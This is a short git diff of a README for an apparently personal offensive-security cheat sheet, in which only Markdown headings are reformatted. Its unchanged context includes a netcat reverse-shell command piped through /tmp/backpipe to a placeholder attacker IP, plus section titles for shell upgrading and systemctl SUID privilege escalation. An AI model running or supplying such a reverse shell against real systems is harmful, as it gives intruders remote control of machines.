@@ -1,7 +1,7 @@
 # CyberCheatSheets
 Reference Sheets / Notes of techniques learned
 
-##Reverse Shells:
+## Reverse Shells:
 
 + <b>Netcat - Listener</b>
 ```
@@ -20,7 +20,7 @@ $/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 ```
 
 
-##Stabilizing/ Upgrading Shells:
+## Upgrading/Stablizing Shells:
 
 + <b>Using Ptyhon</b>
 
@@ -38,7 +38,7 @@ $stty raw -echo; fg
 ```
 
 
-##Privilege Escalation:
+## Privilege Escalation:
 
 + <b>`/bin/systemctl` SUID</b>
 
